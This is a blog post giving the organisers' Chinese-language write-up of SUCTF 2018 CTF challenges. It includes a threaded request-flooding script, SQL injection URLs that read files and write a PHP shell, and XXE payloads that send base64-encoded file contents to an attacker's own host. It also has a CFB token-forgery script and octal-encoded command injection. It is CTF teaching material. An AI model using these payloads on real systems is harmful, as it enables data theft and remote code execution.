<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="SUCTF WriteUp 全题目SUCTF题目docker镜像:  suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymoussuctf/2018-pwn-notesuctf/2018-pwn-noendsuctf/2018">
<meta property="og:type" content="article">
<meta property="og:title" content="MOVING!">
<meta property="og:url" content="http://yoursite.com/2018/05/29/SUWP/index.html">
<meta property="og:site_name" content="MOVING!">
<meta property="og:description" content="SUCTF WriteUp 全题目SUCTF题目docker镜像:  suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymoussuctf/2018-pwn-notesuctf/2018-pwn-noendsuctf/2018">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://p0.ssl.qhimg.com/t013dc232b067950e6e.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t01e818f0c40240e5ae.png">
<meta property="og:image" content="https://p0.ssl.qhimg.com/t0177f2a42ed7fd7008.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t012fb5f6287b5b4d8c.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t010bf056ea09b3f767.png">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t0130b3ff8e4cda0ea7.png">
<meta property="og:image" content="https://p3.ssl.qhimg.com/t0173e9bbb2d5d4eae9.png">
<meta property="og:image" content="https://p1.ssl.qhimg.com/t01b62e7fa3a1be7cd5.png">
<meta property="og:image" content="https://p5.ssl.qhimg.com/t0118bc030c71f4729d.png">
<meta property="og:updated_time" content="2018-05-29T08:34:43.281Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MOVING!">
<meta name="twitter:description" content="SUCTF WriteUp 全题目SUCTF题目docker镜像:  suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymoussuctf/2018-pwn-notesuctf/2018-pwn-noendsuctf/2018">
<meta name="twitter:image" content="https://p0.ssl.qhimg.com/t013dc232b067950e6e.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2018/05/29/SUWP/"/>





  <title> | MOVING!</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">MOVING!</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/29/SUWP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MOVING!">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline"></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-29T16:35:58+08:00">
                2018-05-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="SUCTF-WriteUp-全题目"><a href="#SUCTF-WriteUp-全题目" class="headerlink" title="SUCTF WriteUp 全题目"></a>SUCTF WriteUp 全题目</h1><p>SUCTF题目docker镜像:</p>
<blockquote>
<p>suctf/2018-web-multi_sql<br>suctf/2018-web-homework<br>suctf/2018-web-hateit<br>suctf/2018-web-getshell<br>suctf/2018-web-annonymous<br>suctf/2018-pwn-note<br>suctf/2018-pwn-noend<br>suctf/2018-pwn-lock2<br>suctf/2018-pwn-heapprint<br>suctf/2018-pwn-heap<br>suctf/2018-misc-padding<br>suctf/2018-misc-game<br>suctf/2018-misc-rsagood<br>suctf/2018-misc-rsa<br>suctf/2018-misc-enjoy<br>suctf/2018-misc-pass<br>下面的exp中，许多地址使用的是出题人的本地环境，因此测试时请注意</p>
</blockquote>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h3><p>这个题目是从HITCON CTF上找到的一个思路，因为有现成的打法，因此这个题目在一开就放了出来。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">        PORT = <span class="number">23334</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">'GET / HTTP/1.1\nHost: localhost\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><ul>
<li>题目过滤了大多数可见字符，为了给大家写shell，从第六位开始过滤字符，过滤字符可以Fuzz。</li>
<li>可以写入的字符有~  $  _  ;  =  (  )</li>
<li>所以考虑取反符~和不可见字符写shell。</li>
<li>编码ISO-8859-15中可以用~进行取反生成所需字符</li>
<li>payload因为编码问题显示不出来,一句话马参考payload.php文件，密码_</li>
<li>参考文章<a href="http://www.hack80.com/forum.php?mod=viewthread&amp;tid=46962&amp;extra=page%3D1" target="_blank" rel="noopener">传送门</a></li>
</ul>
<h4 id="注意问题"><a href="#注意问题" class="headerlink" title="注意问题"></a>注意问题</h4><ul>
<li>单纯的文件中写入payload，是无法正常执行的，因为文件的编码需要保存成ISO-8859-15</li>
<li>先讲文件编码改成ISO-8859-15，再写入paylaod，不然在保存payload时有可能会改变不可见字符编码。</li>
</ul>
<h3 id="MultiSql"><a href="#MultiSql" class="headerlink" title="MultiSql"></a>MultiSql</h3><ul>
<li><a href="http://127.0.0.1:8088/user/user.php?id=6^(if(ascii(mid(user(),1,1))&gt;0,0,1)" target="_blank" rel="noopener">http://127.0.0.1:8088/user/user.php?id=6^(if(ascii(mid(user(),1,1))&gt;0,0,1)</a>) 存在注入（过滤了union、select、&amp;、|….）</li>
<li>注入得到root用户，尝试读文件</li>
</ul>
<blockquote>
<p><a href="http://127.0.0.1:8088/user/user.php?id=6^(if(ascii(mid(load_file(0x2F7661722F7777772F68746D6C2F696E6465782E706870),1,2))&gt;1,0,1)" target="_blank" rel="noopener">http://127.0.0.1:8088/user/user.php?id=6^(if(ascii(mid(load_file(0x2F7661722F7777772F68746D6C2F696E6465782E706870),1,2))&gt;1,0,1)</a>)</p>
</blockquote>
<ul>
<li>在/var/www/html/user/user.php中发现是用mysqli_multi_query()函数进行sql语句查询的，可以多语句执行</li>
<li>/var/www/html//bwvs_config/waf.php添加了魔术引号函数</li>
<li>为了绕过单双引号，使用mysql的预处理语句：</li>
</ul>
<blockquote>
<p>set @sql = concat(‘create table ‘,newT,’ like ‘,old);<br>prepare s1 from @sql;<br>execute s1; </p>
</blockquote>
<ul>
<li><p>将<code>select &#39;&lt;?php phpinfo();?&gt;&#39; into outfile &#39;/var/www/html/favicon/1.php&#39;;</code>语句编码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(39),CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(112),CHAR(104),CHAR(112),CHAR(105),CHAR(110),CHAR(102),CHAR(111),CHAR(40),CHAR(41),CHAR(59),CHAR(63),CHAR(62),CHAR(39),CHAR(32),CHAR(105),CHAR(110),CHAR(116),CHAR(111),CHAR(32),CHAR(111),CHAR(117),CHAR(116),CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(32),CHAR(39),CHAR(47),CHAR(118),CHAR(97),CHAR(114),CHAR(47),CHAR(119),CHAR(119),CHAR(119),CHAR(47),CHAR(104),CHAR(116),CHAR(109),CHAR(108),CHAR(47),CHAR(102),CHAR(97),CHAR(118),CHAR(105),CHAR(99),CHAR(111),CHAR(110),CHAR(47),CHAR(49),CHAR(46),CHAR(112),CHAR(104),CHAR(112),CHAR(39),CHAR(59));</span><br><span class="line">PREPARE s2 FROM @s;</span><br><span class="line">EXECUTE s2;</span><br></pre></td></tr></table></figure>
</li>
<li><p>经shell写到<a href="http://127.0.0.1:8088/favicon/1.php" target="_blank" rel="noopener">http://127.0.0.1:8088/favicon/1.php</a></p>
</li>
</ul>
<h3 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a>Homework</h3><ul>
<li>注册账号，登录作业平台。看到一个calc计算器类。有两个按钮，一个用于调用calc类实现两位数的四则运算。另一个用于提交代码。</li>
</ul>
<p><img src="https://p0.ssl.qhimg.com/t013dc232b067950e6e.png" alt=""></p>
<ul>
<li>XXE注入<br>点击calc按钮，计算2+2得到结果为4。</li>
</ul>
<p><img src="https://p1.ssl.qhimg.com/t01e818f0c40240e5ae.png" alt=""></p>
<p>根据url结合calc源码可得到，module为调用的类，args为类的构造方法的参数。在PHP中存在内置类。其中包括SimpleXMLElement，文档中对于<code>SimpleXMLElement::__construct</code>定义如下:</p>
<p><img src="https://p0.ssl.qhimg.com/t0177f2a42ed7fd7008.png" alt=""></p>
<p><img src="https://p1.ssl.qhimg.com/t012fb5f6287b5b4d8c.png" alt=""></p>
<p>可以看到通过设置第三个参数为true，可实现远程xml文件载入。第二个参数的常量值我们设置为2即可。第二个参数可定义的所有常量在<a href="http://php.net/manual/zh/libxml.constants.php" target="_blank" rel="noopener">这里</a>。第一个参数就是我们自己设置的payload的地址，用于引入外部实体。</p>
<p>在自己的vps上构造obj.xml文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE try[   </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % int SYSTEM "http://vps/XXE/evil.xml"&gt;  </span></span><br><span class="line"><span class="meta">%int;  </span></span><br><span class="line"><span class="meta">%all;  </span></span><br><span class="line"><span class="meta">%send;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>evil.xml代码如下:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span>  <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///home/wwwroot/default/index.php</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://vps/XXE/1.php?file=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
<p>1.php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content=$_GET[<span class="string">'file'</span>];</span><br><span class="line">file_put_contents(<span class="string">"content.txt"</span>,$content);</span><br></pre></td></tr></table></figure>
<p>构造payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target:8888/show.php?module=SimpleXMLElement&amp;args[]=http://vps/XXE/obj.xml&amp;args[]=2&amp;args[]=true</span><br></pre></td></tr></table></figure>
<p>在自己的vps上查看content.txt即可看到base64编码后的index.php的源码。但是并不是完整的代码。需要将所有base64编码以空格或斜杠分割。逐一进行base64解码，拼接在一起才是完整的源码。我的解码脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$source=<span class="string">"base64 code"</span>;</span><br><span class="line">$sour=explode(<span class="string">" "</span>,$source);</span><br><span class="line">$code=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">foreach</span>($sour <span class="keyword">as</span> $value)&#123;</span><br><span class="line">	<span class="keyword">if</span>(strpos(<span class="string">"/"</span>,$value))&#123;</span><br><span class="line">		$v=explode(<span class="string">"/"</span>,$value);</span><br><span class="line">		<span class="keyword">foreach</span>($v <span class="keyword">as</span> $v1)&#123;</span><br><span class="line">			<span class="keyword">echo</span> base64_decode($v1).<span class="string">"\r\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> base64_decode($value).<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>SimpleXMLElement::__construct</code>进行文件读取的过程中会导致部分字符的丢失，但是不影响代码的整体阅读。所以在通过脚本解码之后，会有部分字符丢失。还有一点需要特别注意的是，通过这种方式读取的文件大小一般不能超过3kb。否则会读取失败，正是因为这个原因，我才把login拆分成login.php和login_p.php。</p>
<p>通过同样的方式，读取所有源码。下载下来后进行代码审计。</p>
<ul>
<li>代码审计——sql注入</li>
</ul>
<p>可以看到在submit.php中调用upload_file()函数。跟进function中的upload_file，可以看到将我们上传的文件的文件名及随机生成的md5值还有一个随机数sig存入数据库。文件名有过滤，在无0day的情况下无法绕过。文件名不可控，唯一的可控点就是通过post提交的sig。</p>
<p>通过审计可以看出来，在文件上传处存在一个二次注入。在文件上传时设置sig为十六进制数据，将sql语句注入数据库。在show.php页面触发。</p>
<p><img src="https://p1.ssl.qhimg.com/t010bf056ea09b3f767.png" alt=""></p>
<p><img src="https://p3.ssl.qhimg.com/t0130b3ff8e4cda0ea7.png" alt=""></p>
<p>但是show.php页面的查看源码功能只有本地用户才可访问。因此我们还需要寻找一个ssrf进行访问。由于代码中有sql的报错回显，所以我们可以继续使用<code>SimpleXMLElement::__construct</code>读取回显内容。</p>
<p>首先在submit.php上传任意文件。在上传前修改html中sig的value值即可。</p>
<p><img src="https://p3.ssl.qhimg.com/t0173e9bbb2d5d4eae9.png" alt=""></p>
<p>这里的数据是<code>&#39;||extractvalue(1,concat(0x7e,(select @@version),0x7e))||&#39;</code>的十六进制编码。接下来修改evil.xml文件如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file  SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://localhost/show.php?action=view&amp;filename=1.aspx&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://vps/XXE/1.php?file=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>利用<code>SimpleXMLElement::__construct</code>触发ssrf并读取内容。方法和文件读取相同，exp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target/show.php?module=SimpleXMLElement&amp;args[]=http://vps/XXE/obj.xml&amp;args[]=2&amp;args[]=true</span><br></pre></td></tr></table></figure>
<p>在content.txt中就可以看到报错注入的回显信息的base64编码，用上面的解码脚本跑一下就行。</p>
<p><img src="https://p1.ssl.qhimg.com/t01b62e7fa3a1be7cd5.png" alt=""></p>
<p>最后getflag的exp如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii：&apos;||extractvalue(1,concat(0x7e,(select flag from flag),0x7e))||&apos;</span><br><span class="line">hex：0x277C7C6578747261637476616C756528312C636F6E63617428307837652C2873656C65637420666C61672066726F6D20666C6167292C3078376529297C7C27</span><br></pre></td></tr></table></figure>
<p><img src="https://p5.ssl.qhimg.com/t0118bc030c71f4729d.png" alt=""></p>
<h3 id="HateIT"><a href="#HateIT" class="headerlink" title="HateIT"></a>HateIT</h3><p>首先发现有.git文件夹存在，于是拿githack还原了下，发现一个readme，读完之后，发现有历史版本存在，查看网站的.git文件发现有标签，结合readme，猜测源码在标签里，于是写脚本还原。</p>
<p>还原之后发现一些php文件和opcode,通过opcode还原代码，而其他文件无法打开，在robots.txt里面发现一个so文件，结合readme推断出php文件是使用so文件加密过的，通过逆向so文件还原出源代码，开始代码审计。</p>
<p>打开之后理了遍流程，发现是通过输入的用户名进行加密，获得sign和token，加密方法使用的是cfb，然后再往下就是将token解密，将解密的结果通过  |  进行分割，并取第二个参数进行判断admin，但是通过阅读代码，可以发现正常流程下，是无法通过判断的。</p>
<p>观察加密流程，func.php里面有两个加密函数，两个解密函数，其中一组是aes-128-cbc，一组是cfb，但是cbc的加密解密并未使用。</p>
<p>这里的加密我写的有问题，很多选手直接伪造第二个参数为3就绕过了检查，使得整个题目的难度降了一级，然而我本意是想考一波CFB的重放攻击的，非常的可惜，但是自己写出来的洞，跪着也要担着，所以接下来的思路，我还是以CFB为主。</p>
<p>于是看一下加密流程，先是将  <code>$user|$admin|$md5</code>进行加密，然后放入session，但是后面会将session输出，因此我们可以获得自己的token和sign。</p>
<p>因此我们需要伪造session来通过判断。对于token的加密使用的是cfb，<br>cfb是使用的分组加密，因此我们需要传入token值，使得其解密后的token[1]的值为2，能看到，程序中使用的是int函数进行转换，这里就涉及到了php的弱类型问题，原先的token组成为：</p>
<blockquote>
<p>$token = $user|$admin|$md5</p>
</blockquote>
<p>先拓展token长度</p>
<blockquote>
<p>$token = $user|$admin|$md5$user|$admin|$md5</p>
</blockquote>
<p>再将第一段<code>$admin|$md5</code>部分与2异或，这样最终的第二段的解密结果以2开头，后续的数据被破坏，尽管 | 还是有三个，但是cfb是密文分组参与异或，因此第二段的错误会引起第三段16位一组的密文分组错误。</p>
<p>CFB攻击的脚本如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">plain = <span class="string">"meizimeizimeizi|0|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e"</span></span><br><span class="line">token = <span class="string">"32b85d5f397d51156d2bc0cca7851cb8ba1bda625324964543d56974057bede0b886428015f9c6544269d81ed6450f8fe7dacebfabcc1ea1270a225d4ac90163"</span></span><br><span class="line">raw_token = token.decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> len(raw_token)</span><br><span class="line"><span class="keyword">print</span> len(plain)</span><br><span class="line">fake_token = list(raw_token)</span><br><span class="line">temp = fake_token[<span class="number">-64</span>:]</span><br><span class="line">fake_token[<span class="number">16</span>] = chr(ord(raw_token[<span class="number">16</span>]) ^ ord(plain[<span class="number">16</span>]) ^ ord(<span class="string">"3"</span>))</span><br><span class="line">fake_token = fake_token + temp</span><br><span class="line">fake_token = <span class="string">""</span>.join(fake_token).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fake_token</span><br></pre></td></tr></table></figure>
<p>此时便绕过了第一个admin部分的检查。</p>
<p>再阅读源码，发现在class.php中，有个system函数，而system函数的参数是从get传参的，而其验证只允许\和数字，因此可以使用八进制传输命令。</p>
<p>因此直接<code>admin.php?action=viewImage&amp;size=\073\154\163\073</code>，即:<code>;ls;</code>，即可执行ls命令.然后<code>cat flag</code>的位置即可。</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>mips题目，简单的base64变形解码，替换了base64置换表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">base64list = <span class="string">'R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/0Dg5zXAFqQfxBicV3m8U'</span></span><br><span class="line">cipherlist = <span class="string">"eQ4y46+VufZzdFNFdx0zudsa+yY0+J2m"</span></span><br><span class="line"></span><br><span class="line">length=len(cipherlist)</span><br><span class="line"><span class="keyword">print</span> length</span><br><span class="line">group=length/<span class="number">4</span></span><br><span class="line">s=<span class="string">''</span></span><br><span class="line">string=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(group<span class="number">-1</span>):</span><br><span class="line">	j=i*<span class="number">4</span></span><br><span class="line">	s=cipherlist[j:j+<span class="number">4</span>]</span><br><span class="line">	string+=chr(((base64list.index(s[<span class="number">0</span>]))&lt;&lt;<span class="number">2</span>)+((base64list.index(s[<span class="number">1</span>]))&gt;&gt;<span class="number">4</span>))</span><br><span class="line">	string+=chr(((base64list.index(s[<span class="number">1</span>]) &amp; <span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>)+((base64list.index(s[<span class="number">2</span>]))&gt;&gt;<span class="number">2</span>))</span><br><span class="line">	string+=chr(((base64list.index(s[<span class="number">2</span>]) &amp; <span class="number">0x03</span>)&lt;&lt;<span class="number">6</span>)+((base64list.index(s[<span class="number">3</span>]))))</span><br><span class="line">j=(group<span class="number">-1</span>)*<span class="number">4</span></span><br><span class="line">s=cipherlist[j:j+<span class="number">4</span>]</span><br><span class="line">string+=chr(((base64list.index(s[<span class="number">0</span>]))&lt;&lt;<span class="number">2</span>)+((base64list.index(s[<span class="number">1</span>]))&gt;&gt;<span class="number">4</span>))</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">2</span>]==<span class="string">'='</span>:</span><br><span class="line">	<span class="keyword">print</span> string</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	string+=chr(((base64list.index(s[<span class="number">1</span>]) &amp; <span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>)+((base64list.index(s[<span class="number">2</span>]))&gt;&gt;<span class="number">2</span>))</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">3</span>]==<span class="string">'='</span>:</span><br><span class="line">	<span class="keyword">print</span> string</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	string+=chr(((base64list.index(s[<span class="number">2</span>]) &amp; <span class="number">0x03</span>)&lt;&lt;<span class="number">6</span>)+((base64list.index(s[<span class="number">3</span>]))))</span><br><span class="line">	<span class="keyword">print</span> string</span><br><span class="line">    </span><br><span class="line"><span class="comment">#SUCTF&#123;wh0_1s_y0ur_d4ddy&#125;</span></span><br></pre></td></tr></table></figure>
